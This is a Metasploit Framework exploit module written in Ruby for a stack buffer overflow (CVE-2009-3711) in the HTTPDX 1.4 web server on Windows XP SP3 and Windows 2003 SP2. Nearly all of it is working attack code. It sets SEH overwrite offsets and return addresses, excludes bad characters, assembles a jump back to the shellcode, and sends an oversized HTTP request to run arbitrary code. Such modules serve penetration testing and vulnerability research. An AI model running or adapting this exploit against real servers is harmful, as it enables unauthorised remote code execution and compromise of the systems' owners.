##
# $Id: httpdx_handlepeer.rb 9934 2010-07-26 23:22:42Z jduck $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

##
# httpdx_handlepeer.rb
#
# HTTPDX 'h_handlepeer()' Function Buffer Overflow exploit for the Metasploit Framework
#
# Tested successfully on the following platforms
#  - HTTPDX 1.4 on Microsoft Windows XP SP3
#
# This vulnerability was found by Pankaj Kohli, see references.
#
# Trancer
# http://www.rec-sec.com
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = GreatRanking

	HttpFingerprint = { :pattern => [ /httpdx\/.* \(Win32\)/ ] }

	include Msf::Exploit::Remote::HttpClient
	include Msf::Exploit::Remote::Seh

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'HTTPDX h_handlepeer() Function Buffer Overflow',
			'Description'    => %q{
					This module exploits a stack-based buffer overflow vulnerability in HTTPDX HTTP server 1.4. The
				vulnerability is caused due to a boundary error within the "h_handlepeer()" function in http.cpp.
				By sending an overly long HTTP request, an attacker can overrun a buffer and execute arbitrary code.
			},
			'Author'         =>
				[
					'Pankaj Kohli <pankaj208[at]gmail.com>',	# Original exploit [see References]
					'Trancer <mtrancer[at]gmail.com>',			# Metasploit implementation
					'jduck'
				],
			'Version'        => '$Revision: 9934 $',
			'References'     =>
				[
					[ 'OSVDB', '58714' ],
					[ 'CVE', '2009-3711' ],
					[ 'URL', 'http://www.pank4j.com/exploits/httpdxb0f.php' ],
					[ 'URL', 'http://www.rec-sec.com/2009/10/16/httpdx-buffer-overflow-exploit/' ]
				],
			'DefaultOptions' =>
				{
					'EXITFUNC' => 'process'
				},
			'Privileged'     => true,
			'Payload'        =>
				{
					'Space'    => 472,
					# other characters get mangled, but only in a temporary buffer
					'BadChars' => "\x00\x0a\x0d\x20\x25\x2e\x2f\x3f\x5c",
					'StackAdjustment' => -3500,
					# 'DisableNops'	=>  'True'
				},
			'Platform'       => 'win',
			'Targets'        =>
				[
					[	'httpdx 1.4 - Windows XP SP3 English',
						{
							'Offset' 	=> 476,
							'Ret' 		=> 0x63b81a07,  # seh handler (pop/pop/ret in n.dll)
							'Readable' 	=> 0x63b80131 	 # early in n.dll
						}
					],
					[	'httpdx 1.4 - Windows 2003 SP2 English',
						{
							'Offset' 	=> 472,
							'Ret' 		=> 0x63b81a07,  # seh handler (pop/pop/ret in n.dll)
							'Readable' 	=> 0x63b80131 	 # early in n.dll
						}
					]
				],
			'DefaultTarget'  => 0,
			'DisclosureDate' => 'Oct 08 2009'
		))
	end

	def check
		info = http_fingerprint  # check method
		if info and (info =~ /httpdx\/(.*) \(Win32\)/)
			return Exploit::CheckCode::Vulnerable
		end
		Exploit::CheckCode::Safe
	end


	def exploit
		uri = payload.encoded
		if target['Offset'] > payload_space
			pad = target['Offset'] - payload_space
			uri << rand_text(pad)
		end
		uri << generate_seh_record(target.ret)
		# jmp back to shellcode
		uri << Metasm::Shellcode.assemble(Metasm::Ia32.new, "jmp $-" + (target['Offset'] + 5).to_s).encode_string
		# extra causing hitting end of the stack
		uri << rand_text_alphanumeric(1024)

		uri[620,4] = [target['Readable']].pack('V') # arg (must be readable)

		sploit = '/' + rand_text(3) + '=' + uri

		# an empty host header gives us 512 bytes in the client structure
		# (the client->filereq and client->host buffers are adjacement in memory)
		datastore['VHOST'] = ''

		print_status("Trying target #{target.name}...")
		res = send_request_raw(
			{
				'uri'      => sploit
			}, 5)

		handler
	end

end
